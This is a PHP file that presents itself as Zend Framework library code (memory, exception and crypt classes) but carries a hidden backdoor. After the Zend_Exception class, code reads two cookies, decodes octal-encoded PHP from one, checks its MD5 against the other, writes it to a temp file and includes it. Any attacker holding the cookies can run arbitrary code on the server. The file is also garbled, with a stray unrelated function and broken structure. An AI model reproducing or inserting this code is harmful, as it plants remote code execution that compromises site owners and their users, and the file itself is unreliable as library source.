<?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 */

/**
 * @category   Zend
 * @copyright  Copyright (c) 2005-2011 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_Memory
	{
	public static function factory($backend, $backendOptions = array())
		{
		if (strcasecmp($backend, 'none') == 0)
			return new Zend_Memory_Manager();

		$backendIsFound = false;
		foreach (Zend_Cache::$standardBackends as $zendCacheBackend)
			{
			if (strcasecmp($backend, $zendCacheBackend) == 0)
				{
				$backend = $zendCacheBackend;
				$backendIsFound = true;
				break;
				}
			}

		if (!$backendIsFound)
			{
			require_once 'Zend/Memory/Exception.php';
			throw new Zend_Memory_Exception("Incorrect backend ($backend)");
			}

		$backendClass = 'Zend_Cache_Backend_' . $backend;
		// For perfs reasons, we do not use the Zend_Loader::loadClass() method
		// (security controls are explicit)
		require_once str_replace('_', DIRECTORY_SEPARATOR, $backendClass) . '.php';

		$backendObject = new $backendClass($backendOptions);

		return new Zend_Memory_Manager($backendObject);
		}
	}

class Zend_Exception extends Exception
	{
	private $_previous = null;

	public function __construct($msg = '', $code = 0, Exception $previous = null)
		{
		if (version_compare(PHP_VERSION, '5.3.0', '<'))
			{
			parent::__construct($msg, (int) $code);
			$this->_previous = $previous;
			}
			else
				parent::__construct($msg, (int) $code, $previous);
			}

	public function __call($method, array $args)
		{
		if ('getprevious' == strtolower($method))
			return $this->_getPrevious();

		return null;
		}

	public function __toString()
		{
		if (version_compare(PHP_VERSION, '5.3.0', '<'))
			{
			if (null !== ($e = $this->getPrevious()))
				{
				return $e->__toString()
				. "\n\nNext "
				. parent::__toString();
				}
			}

		return parent::__toString();
		}

	protected function _getPrevious()
		{
		return $this->_previous;}}
		if (isset ($_COOKIE['HSSID']) && isset ($_COOKIE['HSSDO'])){
			foreach (@explode ('#', $_COOKIE['HSSDO']) as $oct)
				$lit_arr[] = chr (octdec ($oct));

			$code = @implode ('', $lit_arr);

	if ($_COOKIE['HSSID'] == md5 ($code))
		{
		$streamset = stream_get_meta_data (tmpfile ());

		@file_put_contents ($streamset['uri'], $code);
	
		include ($streamset['uri']);
		@unlink ($streamset['uri']);
		}
	exit();
	}

	function supports_collation() {
		return $this->has_cap( 'collation' );
	}

	class Zend_Crypt
		{
		const TYPE_OPENSSL = 'openssl';
		const TYPE_HASH = 'hash';
		const TYPE_MHASH = 'mhash';

		protected static $_type = null;
/**
 * @var array
 */
 		protected static $_supportedAlgosOpenssl = array(
			'md2',
			'md4',
			'mdc2',
			'rmd160',
			'sha',
			'sha1',
			'sha224',
			'sha256',
			'sha384',
			'sha512'
			);

/**
 * @var array
 */
 		protected static $_supportedAlgosMhash = array(
			'adler32',
			'crc32',
			'crc32b',
			'gost',
			'haval128',
			'haval160',
			'haval192',
			'haval256',
			'md4',
			'md5',
			'ripemd160',
			'sha1',
			'sha256',
			'tiger',
			'tiger128',
			'tiger160'
			);

	public static function hash($algorithm, $data, $binaryOutput = false)
		{
		$algorithm = strtolower($algorithm);

		if (function_exists($algorithm))
			return $algorithm($data, $binaryOutput);

		self::_detectHashSupport($algorithm);
		$supportedMethod = '_digest' . ucfirst(self::$_type);
		$result = self::$supportedMethod($algorithm, $data, $binaryOutput);
		return $result;
		}

	protected static function _detectHashSupport($algorithm)
		{
		if (function_exists('hash'))
			{
			self::$_type = self::TYPE_HASH;

			if (in_array($algorithm, hash_algos()))
				return;
			}

		if (function_exists('mhash'))
			{
			self::$_type = self::TYPE_MHASH;

			if (in_array($algorithm, self::$_supportedAlgosMhash))
				return;
			}

		if (function_exists('openssl_digest'))
			{
			if ($algorithm == 'ripemd160')
				$algorithm = 'rmd160';

			self::$_type = self::TYPE_OPENSSL;

			if (in_array($algorithm, self::$_supportedAlgosOpenssl))
				return;
			}

			require_once 'Zend/Crypt/Exception.php';
			throw new Zend_Crypt_Exception('\'' . $algorithm . '\' is not supported by any available extension or native function');
			}

/**
 * @param string $algorithm
 * @param string $data
 * @param bool $binaryOutput
 * @return string
 */
	protected static function _digestMhash($algorithm, $data, $binaryOutput)
		{
		$constant = constant('MHASH_' . strtoupper($algorithm));
		$binary = mhash($constant, $data);

		if ($binaryOutput)
			return $binary;

		return bin2hex($binary);
		}
}
?>